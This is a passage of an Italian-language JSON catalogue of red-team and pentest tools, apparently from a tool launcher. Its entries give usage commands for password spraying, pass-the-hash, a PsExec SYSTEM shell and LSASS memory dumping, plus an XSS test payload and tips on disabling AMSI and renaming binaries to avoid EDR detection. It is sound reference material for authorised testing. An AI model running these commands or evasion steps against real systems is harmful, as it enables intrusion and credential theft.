<code>SessionLoop</code> in ambienti monitorati. Eseguire da un IP in whitelist se possibile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "sharpmapexec",
    "name": "SharpMapExec.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/cube0x0/SharpMapExec",
    "desc": "Porting C# di CrackMapExec per post-exploitation: esegue spraying, check credenziali e comandi WMI/SMB/WinRM nativamente.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpMapExec è una riscrittura in C# del popolare CrackMapExec (CME). Nasce per offrire le stesse capacità di network sweeping e lateral movement in un formato eseguibile nativo (.NET assembly), ideale per essere eseguito via Cobalt Strike `execute-assembly` o altri C2 framework, bypassando la necessità di proxyare traffico o installare Python/dipendenze sul target compromesso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Living off the Land:</strong> Sfrutta le librerie native di Windows per le comunicazioni di rete, riducendo le dipendenze esterne. Esegue autenticazioni NTLM/Kerberos per validare credenziali su ampi range di IP.</p><p><strong>Esecuzione Comandi:</strong> Supporta diverse strategie di esecuzione remota (WMI, SMB, WinRM) per lanciare payload o comandi di ricognizione su host multipli contemporaneamente.</p><p><strong>Enumerazione:</strong> Raccoglie informazioni vitali come share accessibili, sessioni utente attive, drive mappati e gruppi locali amministrativi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La sintassi cerca di specchiare quella di CME per facilitare la transizione.</p><pre><code># Password Spraying su subnet\nSharpMapExec.exe smb /targets:192.168.1.0/24 /user:admin /password:pass\n\n# Pass-the-Hash e check privilegi admin\nSharpMapExec.exe wmi /targets:servers.txt /user:admin /ntlm:hash /check\n\n# Esecuzione comando su target multipli\nSharpMapExec.exe winrm /targets:10.0.0.50 /user:user /pass:pass /exec:\"ipconfig /all\"</code></pre><p>Gli argomenti possono essere abbreviati e il tool gestisce output colorato per evidenziare successi (Pwn3d!).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Perfetto per il <strong>Lateral Movement</strong> in scenari dove si opera da un beacon in memoria e non si può usare SOCKS proxy. Permette di \"pivotare\" rapidamente testando le credenziali dumpate contro altri host della rete interna direttamente dalla memoria del processo compromesso.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Soffre degli stessi problemi di CME: genera picchi di log di autenticazione. Inoltre, essendo un binario .NET non firmato, è soggetto a scansione AMSI al caricamento.</p><p><strong>Mitigazioni:</strong> Usare tramite `execute-assembly` dopo aver disabilitato/patchato AMSI. Evitare scansioni massive; preferire target list mirate.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "sharpview",
    "name": "SharpView.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/tevora-threat/SharpView",
    "desc": "Porting .NET di PowerView: enumerazione Active Directory stealth eseguibile via C# per bypassare restrizioni PowerShell.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SharpView è la reimplementazione in C# del leggendario PowerView. È stato creato per operare in ambienti dove PowerShell è monitorato (Script Block Logging) o limitato (Constrained Language Mode). Offre le stesse funzioni di ricognizione AD (User hunting, Group enum, Trust mapping) ma in un formato binario compilato, ideale per l'esecuzione \"in-memory\" tramite Cobalt Strike o altri C2.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>API Parity:</strong> Implementa quasi tutti i cmdlet di PowerView (<code>Get-DomainUser</code>, <code>Invoke-ShareFinder</code>, ecc.) mantenendo la stessa sintassi degli argomenti.</p><p><strong>Bypass AMSI:</strong> Essendo .NET assembly, è più facile da caricare eludendo le firme AMSI rispetto agli script .ps1 grezzi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Eseguire come normale binario o via assembly loader.</p><pre><code># Enumerazione utenti con dettagli\nSharpView.exe Get-DomainUser -Properties samaccountname,description\n\n# Ricerca admin locali\nSharpView.exe Find-LocalAdminAccess</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Evasion & Recon:</strong> Quando <code>powershell.exe</code> è bloccato o allarma il SOC, SharpView permette di continuare la ricognizione situazionale del dominio utilizzando processi legittimi per caricare il codice .NET.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Sebbene eviti PS, genera comunque traffico LDAP/RPC verso il DC analizzabile da Defender for Identity. Il binario su disco è firmato come hacktool.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Recon_Health"
    ],
    "notes": null
  },
  {
    "id": "snaffler",
    "name": "Snaffler.exe",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/SnaffCon/Snaffler",
    "desc": "Scanner avanzato per share SMB che identifica file sensibili (password, chiavi SSH, config) tramite pattern matching e regex.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Snaffler è uno strumento di \"caccia al tesoro\" automatizzata per ambienti Active Directory. Scansiona le share di rete accessibili (SYSVOL, netlogon, file server) alla ricerca di dati sensibili che gli amministratori o gli utenti hanno lasciato incustoditi. Utilizza un motore di regole sofisticato per distinguere tra file spazzatura e vere credenziali, chiavi private, backup di database o file di configurazione con password in chiaro.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery Intelligente:</strong> Non si limita a cercare nomi di file. Ispeziona il contenuto dei file (fino a una certa dimensione) cercando pattern regex di credenziali, stringhe di connessione SQL, token API e altro.</p><p><strong>Riduzione Rumore:</strong> Il suo punto di forza è la capacità di scartare falsi positivi (es. file .xml di esempio) e classificare i ritrovamenti per livello di gravità (Nero, Rosso, Giallo, Verde), permettendo al pentester di focalizzarsi solo sui dati critici.</p><p><strong>Velocità:</strong> Fortemente multithreaded, può processare terabyte di dati distribuiti su centinaia di share in tempi ridotti.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede di essere eseguito da un utente di dominio. L'output a video è molto verboso, quindi è essenziale loggare su file.</p><pre><code># Scansione standard (molto rumorosa a video)\nSnaffler.exe -s -o risultati.log\n\n# Scansione mirata su computer specifici con output dettagliato\nSnaffler.exe -n -i computers.txt -o snaffler.log -v data\n\n# Analisi dei risultati (live triage)\nGet-Content snaffler.log -Wait | Select-String \"^(\\{Black\\}|\\{Red\\})\"</code></pre><p>Le tag <code>{Black}</code> indicano ritrovamenti critici certi (es. file id_rsa senza password), <code>{Red}</code> alta probabilità di credenziali.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante la <strong>Post-Exploitation</strong>, spesso fornisce la chiave per il dominio (es. un file <code>web.config</code> con password di sa o un backup di AD). In fase di <strong>Audit/Cleanup</strong>, aiuta le aziende a identificare e rimuovere dati sensibili esposti a tutti gli utenti del dominio.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera un traffico SMB di lettura massivo. Può saturare la banda se non limitato. I sistemi DLP o di monitoraggio file server noteranno l'accesso a migliaia di file in breve tempo.</p><p><strong>Impatto operativo:</strong> Alto consumo di IOPS sui file server.</p><p><strong>Mitigazioni:</strong> Eseguire in orari non lavorativi. Usare opzioni per limitare il numero di thread o escludere share molto grandi/sensibili.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Lateral_Movement"
    ],
    "notes": null
  },
  {
    "id": "sysinternals-suite",
    "name": "SysinternalsSuite",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite",
    "desc": "Suite ufficiale Microsoft di utility avanzate per troubleshooting, analisi processi, forensics e gestione remota (PsExec, ProcMon, Sysmon).",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>La Sysinternals Suite è una collezione di oltre 70 utility di sistema create da Mark Russinovich (Microsoft). Sebbene nate per amministrazione e debugging, sono armi a doppio taglio fondamentali sia per attaccanti (per movimento laterale, persistenza e evasione) che per difensori (per analisi forense, monitoraggio e rilevamento malware). Essendo firmate digitalmente da Microsoft, spesso bypassano controlli di whitelisting basilari.</p><br><hr><h4 class=\"rt-purple\">Tool Chiave per Security</h4><p><strong>PsExec:</strong> Lo standard per l'esecuzione remota. Permette di lanciare processi su altri sistemi (via SMB/RPC) con privilegi SYSTEM, usato massivamente per lateral movement.</p><p><strong>ProcDump:</strong> Utility da riga di comando per il monitoraggio dei crash, abusata dagli attaccanti per eseguire il dump della memoria del processo LSASS (<code>lsass.exe</code>) e estrarre credenziali senza usare Mimikatz, spesso evadendo gli AV.</p><p><strong>Sysmon:</strong> Strumento difensivo che installa un driver per loggare attività dettagliate di sistema (creazione processi, connessioni di rete, modifica file) nel registro eventi, essenziale per il threat hunting moderno.</p><p><strong>Autoruns & ProcMon:</strong> Fondamentali per analisi forense statica e dinamica, permettono di individuare meccanismi di persistenza (chiavi di registro, servizi, task) e tracciare l'attività real-time di malware.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>La suite è composta da eseguibili standalone portabili.</p><pre><code># PsExec: Shell interattiva remota come SYSTEM\npsexec.exe \\\\192.168.1.50 -u Administrator -p Pass -s cmd.exe\n\n# ProcDump: Dump memoria LSASS (richiede Admin)\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# Sysmon: Installazione con configurazione xml\nsysmon.exe -accepteula -i config.xml</code></pre><p>È possibile usare la versione live web senza download tramite il path UNC: <code>\\\\live.sysinternals.com\\tools\\toolname.exe</code> (se l'accesso internet è permesso).</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In <strong>Red Teaming</strong>, PsExec è il metodo classico per spostarsi dopo aver ottenuto credenziali admin. ProcDump è la tecnica \"Living off the Land\" preferita per il credential harvesting. In <strong>Incident Response</strong>, Process Explorer e Autoruns sono i primi tool lanciati su una macchina sospetta per identificare processi anomali.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> PsExec lascia tracce evidenti (servizio PSEXESVC, Event ID 7045). ProcDump su LSASS è una firma nota per gli EDR. L'uso di <code>live.sysinternals.com</code> genera traffico WebDAV sospetto in uscita.</p><p><strong>Mitigazioni:</strong> Rinominare gli eseguibili (es. <code>pd.exe</code> per ProcDump). Usare varianti di PsExec (come quello di Impacket o CS) che offrono più controllo. Non eseguire mai tool direttamente dal web server Microsoft in un engagement stealth.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Tools_Windows"
    ],
    "notes": null
  },
  {
    "id": "wordlist-paroleitaliane",
    "name": "Parole Italiane",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/napolux/paroleitaliane",
    "desc": "Collezione di wordlist mirate per l'Italia: nomi, cognomi, città e termini comuni per password spraying efficace.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Questa risorsa è una raccolta di dizionari ottimizzati per target italiani. A differenza di wordlist internazionali come RockYou, contiene termini culturalmente specifici (squadre di calcio, nomi di città, mesi in italiano, nomi propri diffusi) che compongono la maggior parte delle password aziendali in Italia. Essenziale per aumentare il tasso di successo nel cracking e nello spraying.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Liste Nomi/Cognomi:</strong> Fondamentali per generare liste di username aziendali (es. <code>m.rossi</code>) o per attacchi a dizionario ibridi.</p><p><strong>Pattern Comuni:</strong> Include parole base che, combinate con regole di mutazione (aggiunta di anno e punto esclamativo), coprono una vasta percentuale di password utente (es. \"Napoli2023!\").</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Da usare come input per tool di cracking.</p><pre><code># Generazione username con regole\nusername-anarchy -i nomi.txt cognomi.txt > userlist.txt\n\n# Cracking Hashcat con regole best64\nhashcat -m 1000 hash.txt parole_italiane.txt -r rules/best64.rule</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Red Teaming Italia:</strong> Inutile usare dizionari inglesi contro un'azienda di PA italiana. L'uso di queste liste riduce il tempo di cracking e aumenta i successi nello spraying.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>Mantenere le liste aggiornate con termini recenti (es. vincitori scudetto, eventi correnti).</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-payloadsallthethings-4-2",
    "name": "PayloadsAllTheThings",
    "version": "4.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/swisskyrepo/PayloadsAllTheThings",
    "desc": "Repository enciclopedico di payload, bypass, cheat sheet e guide per exploitation web, privilege escalation e metodologie di pentest.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>PayloadsAllTheThings non è un singolo eseguibile, ma una risorsa di conoscenza strutturata essenziale per ogni pentester. È un repository che aggrega le tecniche più efficaci, payload di fuzzing, one-liners per reverse shell e guide passo-passo per sfruttare vulnerabilità specifiche (SQLi, XSS, XXE, SSRF, ecc.). Serve come riferimento rapido durante le operazioni per adattare gli attacchi al contesto specifico.</p><br><hr><h4 class=\"rt-purple\">Contenuti principali</h4><p><strong>Web Exploitation:</strong> Liste esaustive di payload per bypassare filtri WAF in attacchi SQL Injection, XSS poliglotti, RCE e Template Injection. Include tecniche per scenari complessi come la deserializzazione insicura in vari linguaggi.</p><p><strong>Methodology & Cheat Sheets:</strong> Guide concise per fasi specifiche: \"Linux Privilege Escalation\", \"Active Directory Methodology\", \"Cloud Hacking\" (AWS, Azure). Offre comandi pronti all'uso per enumerazione ed exploit.</p><p><strong>Intruder Payloads:</strong> Wordlist ottimizzate per l'uso con Burp Suite Intruder, pensate per fuzzare parametri specifici e provocare errori o comportamenti anomali nelle applicazioni target.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Questa risorsa si consulta principalmente via browser o clonando la repo localmente per grep rapidi.</p><pre><code># Clonazione per uso offline\ngit clone https://github.com/swisskyrepo/PayloadsAllTheThings.git\n\n# Ricerca rapida di una reverse shell Python\ngrep -r \"python\" PayloadsAllTheThings/Methodology\\ and\\ Resources/Reverse\\ Shell\\ Cheatsheet.md</code></pre><p>I payload vanno copiati e adattati manualmente (es. cambiando IP/Porta o encoding) prima dell'iniezione nel target.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Quando un exploit standard fallisce a causa di un filtro o di una configurazione particolare, PATT fornisce varianti alternative (es. encoding diversi, metodi di concatenazione stringhe) per tentare il bypass. È la risorsa primaria per costruire <strong>fuzzing list customizzate</strong> durante il testing di applicazioni web robuste.</p><br><hr><h4 class=\"rt-red\">Considerazioni</h4><p>L'uso cieco di payload presi da repository pubblici può essere pericoloso (es. payload che fanno crashare il servizio invece di testarlo) o inefficace. Comprendere sempre cosa fa il codice prima di iniettarlo, specialmente in ambienti di produzione.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-portswigger",
    "name": "PortSwigger",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/PortSwigger/wordlist-extractor",
    "desc": "Wordlist e utility ecosistema Burp Suite per content discovery, fuzzing parametri e integration con Intruder/Extender",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PortSwigger Wordlists</strong> è una collezione di utility e dizionari integrati nell'ecosistema Burp Suite. Include tool per estrarre/generare wordlist da asset dell'applicazione target e alimentarli direttamente in Burp Intruder ed extensions.</p><br><hr><h4 class=\"rt-purple\">Componenti</h4><p><strong>Wordlist Extractor:</strong> Tool per generare wordlist custom da:</p><ul><li>Response bodies di richieste Burp</li><li>File JavaScript e source maps</li><li>Commenti HTML e metadata</li><li>API responses e strutture JSON</li></ul><p><strong>Built-in wordlists:</strong> Burp Suite include dizionari predefiniti per:</p><ul><li>Username/password comuni</li><li>Directory e filename</li><li>Fuzzing parametri</li><li>Estensioni di file backup</li></ul><br><hr><h4 class=\"rt-green\">Integration Workflow</h4><p><strong>1. Estrazione context-aware:</strong> Durante il proxy browsing, catturare richieste e usare wordlist extractor per generare dizionari basati sulle naming conventions osservate.</p><p><strong>2. Intruder payloads:</strong> Importare wordlist custom in Burp Intruder payload sets per fuzzing mirato di directory, parametri, header.</p><p><strong>3. Content Discovery:</strong> Usare con Burp Scanner o Content Discovery extension per enumerazione di endpoint nascosti.</p><br><hr><h4 class=\"rt-amber\">Casi d'Uso</h4><p><strong>API testing:</strong> Estrarre pattern di endpoint da documentazione Swagger/OpenAPI catturata nel proxy.</p><p><strong>Parameter discovery:</strong> Generare lista parametri da analisi JavaScript per parameter pollution testing.</p><p><strong>Backup file hunting:</strong> Creare wordlist con estensioni e suffissi comuni (.bak, .old, .backup) combinati con filename osservati.</p><br><hr><h4 class=\"rt-red\">Best Practice</h4><p>Combinare wordlist PortSwigger con SecLists per coverage estesa. Usare payload processing rules in Intruder per encoding/encryption on-the-fly. Salvare wordlist generate per riuso su target simili. Integrare con Turbo Intruder extension per high-speed fuzzing su wordlist grandi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "wordlist-seclists-2025-2",
    "name": "SecLists",
    "version": "2025.2",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/danielmiessler/SecLists",
    "desc": "La collezione standard de-facto di wordlist per discovery, fuzzing e brute-force: username, password, URL, file sensibili e pattern payload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SecLists è l'archivio definitivo di liste utilizzate dai security tester. Raccoglie dizionari di password reali (es. RockYou), elenchi di username comuni, percorsi di file e directory per web discovery (es. raft, dirb), payload per fuzzing (XSS, SQLi) e molto altro. È la \"munizione\" per qualsiasi tool di brute-force o discovery automatico come Gobuster, wfuzz, Hydra o Burp Suite.</p><br><hr><h4 class=\"rt-purple\">Categorie principali</h4><p><strong>Discovery:</strong> Liste per enumerazione DNS (sottodomini), Web-Content (directory, file backup, admin panel), e parametri API. Include liste specifiche per tecnologie (CMS, IIS, Apache).</p><p><strong>Passwords & Usernames:</strong> Aggregazioni di leak storici, default credentials per dispositivi/software, e pattern comuni di username per password spraying.</p><p><strong>Fuzzing:</strong> Stringhe progettate per provocare crash o errori in applicazioni (buffer overflow patterns, format strings, caratteri speciali, LFI traversal).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>SecLists viene usato come input per altri tool. Solitamente risiede in <code>/usr/share/seclists</code> su Kali/Parrot.</p><pre><code># Web Directory Brute-forcing con Gobuster\ngobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt\n\n# Password Spraying con Hydra\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P password123 ssh://192.168.1.1\n\n# Fuzzing API con Wfuzz\nwfuzz -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u http://api.target/FUZZ</code></pre><p>Selezionare la lista giusta per dimensione e contesto è cruciale per il successo e la velocità dell'attacco.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In ogni fase del pentest: dalla <strong>Recon</strong> (trovare sottodomini nascosti) all'<strong>Exploitation</strong> (indovinare credenziali admin o path di file vulnerabili). È essenziale per scoprire risorse non linkate (\"Security by Obscurity\").</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> L'uso di wordlist grandi genera migliaia di richieste in breve tempo (404 Not Found, 401 Unauthorized), facendo scattare immediatamente WAF, IPS e meccanismi di ban IP.</p><p><strong>Mitigazioni:</strong> Usare liste \"short\" o mirate prima di quelle massiva. Regolare il rate-limit dei tool utilizzati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "00_Common",
      "Wordlists"
    ],
    "notes": null
  },
  {
    "id": "subbrute-77",
    "name": "subbrute-77",
    "version": "",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/TheRook/subbrute",
    "desc": "Variante del tool SubBrute per enumerazione sottodomini tramite DNS ricorsivo aperto, utile per bypassare rate-limit.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>SubBrute è uno strumento di enumerazione sottodomini che si distingue per l'uso di una catena di resolver DNS aperti come proxy. Invece di inviare richieste direttamente dal proprio IP al nameserver autoritativo del target, SubBrute fa rimbalzare le query attraverso resolver pubblici vulnerabili/aperti. Questo non solo maschera l'origine dell'attacco, ma permette di aggirare i rate-limit imposti dal target.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Resolver Chain:</strong> Utilizza una lista di resolver aperti per distribuire il carico delle query.</p><p><strong>Recursive Crawling:</strong> Capace di enumerare record DNS ricorsivamente per trovare sottodomini profondi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script.</p><pre><code># Enumerazione con wordlist default\npython subbrute.py target.com\n\n# Uso lista resolver custom\npython subbrute.py -r resolvers.txt target.com</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>External Recon Stealth:</strong> Quando si vuole mappare l'infrastruttura esterna senza bruciare il proprio IP o essere bloccati per troppe richieste DNS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Il target vede traffico DNS provenire da molti IP diversi (i resolver), rendendo difficile il blocco basato su IP sorgente.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "DNS_Subdomains"
    ],
    "notes": null
  },
  {
    "id": "dirsearch",
    "name": "dirsearch",
    "version": "0.4.3",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/maurosoria/dirsearch",
    "desc": "Fuzzer web multi-thread veloce per discovery di directory, file nascosti e backup, con wordlist intelligenti e filtri.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Dirsearch è uno standard de facto per il web path bruteforcing scritto in Python. È progettato per la velocità e la facilità d'uso, permettendo di scoprire risorse nascoste (admin panel, file .git, backup .bak) su server web. Supporta il fuzzing ricorsivo, estensioni multiple e tecniche di evasione per ridurre i falsi positivi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>High Performance:</strong> Gestisce thread multipli e keep-alive connection per massimizzare il throughput di richieste al secondo.</p><p><strong>Smart Detection:</strong> Rileva automaticamente pagine di \"Not Found\" customizzate e filtra le risposte in base a dimensione, status code o contenuto, riducendo il rumore.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Comando base per scansione con estensioni comuni.</p><pre><code># Scansione base con estensioni php,html,txt\npython3 dirsearch.py -u https://target.com -e php,html,txt\n\n# Scansione con wordlist custom e delay per stealth\npython3 dirsearch.py -u https://target.com -w /path/wordlist.txt -e * --delay 0.5</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Utilizzato in ogni <strong>Web Assessment</strong> dopo la ricognizione iniziale. Trovare un file <code>db_backup.sql.zip</code> o una cartella <code>/.git/</code> dimenticata dagli sviluppatori offre spesso un percorso diretto alla compromissione senza bisogno di exploit complessi.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera migliaia di errori 404. Estremamente rumoroso. WAF e meccanismi di ban IP (Fail2Ban) interverranno quasi subito se non configurato con rate-limit basso.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "aquatone-linux-amd64",
    "name": "aquatone_linux_amd64",
    "version": "1.7.0",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/michenriksen/aquatone",
    "desc": "Tool di ricognizione visiva che esegue screenshot automatici di domini multipli e clusterizza i risultati per rapida revisione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Aquatone è uno strumento essenziale per la ricognizione web su larga scala. Quando si ha a che fare con centinaia di sottodomini, visitarli manualmente è impossibile. Aquatone utilizza browser headless (Chromium/Puppeteer) per visitare automaticamente ogni target, catturare uno screenshot, e raccogliere gli header di risposta. La sua potenza sta nel generare un report HTML visuale che raggruppa le pagine simili, permettendo all'analista di individuare a colpo d'occhio superfici d'attacco interessanti.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Visual Clustering:</strong> Analizza la struttura HTML e gli screenshot per raggruppare pagine identiche (es. pagine di default di IIS o Apache). Questo riduce il rumore, permettendo di ignorare centinaia di siti inutili e concentrarsi sulle deviazioni.</p><p><strong>Port Scanning Integration:</strong> Può importare direttamente output di Nmap o Masscan, o eseguire una scansione rapida delle porte web comuni (80, 443, 8000, 8080) prima di tentare lo screenshot.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Accetta input via pipe standard (es. lista di domini o URL).</p><pre><code># Pipeline tipica: Discovery -> Aquatone\ncat subdomains.txt | ./aquatone_linux_amd64 -ports large -out ./report</code></pre><p>Al termine, aprire il file <code>aquatone_report.html</code> nel browser per navigare i risultati.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>In un <strong>External Infrastructure Assessment</strong>, Aquatone trasforma una lista di 5000 IP in una galleria navigabile, evidenziando immediatamente pannelli di login esposti, directory listing aperti o errori applicativi che espongono versioni software.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Genera traffico HTTP standard, ma con pattern riconoscibili se non si personalizza lo User-Agent. Navigare migliaia di URL in breve tempo può far scattare blocchi IP.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "Visual_Recon"
    ],
    "notes": null
  },
  {
    "id": "whatwaf-1-9",
    "name": "WhatWaf",
    "version": "1.9",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/Ekultek/WhatWaf",
    "desc": "Tool di detection avanzata per Web Application Firewall (WAF) che suggerisce tecniche di bypass e tamper payload.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>WhatWaf rileva la presenza di firewall web analizzando le risposte a payload malevoli e confrontandole con firme note. La sua caratteristica distintiva è la capacità di suggerire script di \"tampering\" (modifica del payload) per tentare di aggirare le protezioni identificate, sfruttando encoding o tecniche di offuscamento specifiche per quel vendor.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>WAF Fingerprinting:</strong> Riconosce oltre 70 WAF diversi (Cloudflare, AWS, Imperva, ModSecurity) tramite analisi header e comportamenti di blocco.</p><p><strong>Bypass Suggestions:</strong> Tenta di inviare payload modificati (es. URL encoding, case variation) per vedere se il WAF li lascia passare, indicando quali tecniche funzionano.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Python script.</p><pre><code># Analisi target\n./whatwaf -u https://target.com\n\n# Tentativo bypass attivo con payload XSS\n./whatwaf -u https://target.com --pl \"<script>alert(1)</script>\" --ra</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Web Assessment:</strong> Prima di lanciare scanner pesanti, capire quale WAF protegge il sito permette di configurare gli scanner con i giusti delay o script di evasione per non essere bannati subito.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> Invia payload di attacco evidenti. Il WAF sicuramente loggerà e bloccherà i tentativi iniziali.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Fingerprinting",
      "WAF"
    ],
    "notes": null
  },
  {
    "id": "paramspider",
    "name": "paramspider",
    "version": "1.0.1",
    "icon": "../app/icons/github.svg",
    "installation": "GitHub",
    "repo": "https://github.com/devanshbatham/ParamSpider",
    "desc": "Tool di ricognizione passiva che estrae parametri URL da archivi web (Wayback Machine) per scoprire vulnerabilità nascoste.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>ParamSpider è uno strumento di ricognizione focalizzato sulla scoperta di parametri URL potenzialmente vulnerabili senza interagire direttamente con il target (passive recon). Interroga enormi archivi storici come la Wayback Machine e Common Crawl per recuperare vecchi URL associati al dominio bersaglio. Questo permette di identificare parametri \"dimenticati\" (es. <code>?debug=true</code>, <code>?admin_token=</code>) che sono vettori ideali per XSS, SQL Injection o SSRF, spesso sfuggiti ai crawler attivi moderni.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mining da Archivi Web:</strong> Non esegue crawling attivo, ma estrae milioni di URL storici dagli archivi pubblici. Questo approccio è invisibile ai sistemi di difesa del target (WAF/SIEM) e rivela endpoint dismessi ma ancora attivi.</p><p><strong>Parameter Cleaning:</strong> Include algoritmi per pulire i risultati, rimuovendo duplicati e URL \"spazzatura\" (es. immagini .jpg, .css) per fornire una lista pulita di parametri testabili (fuzzing ready).</p><p><strong>Supporto Nested Parameters:</strong> Capace di identificare strutture complesse di URL e parametri annidati, spesso usati in applicazioni enterprise legacy.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Richiede Python 3. L'output viene salvato automaticamente in un file txt.</p><pre><code># Scansione base di un dominio\npython3 paramspider.py -d target.com\n\n# Scansione con esclusione di estensioni e output custom\npython3 paramspider.py -d target.com --exclude php,aspx --output params.txt --level high</code></pre><p>I 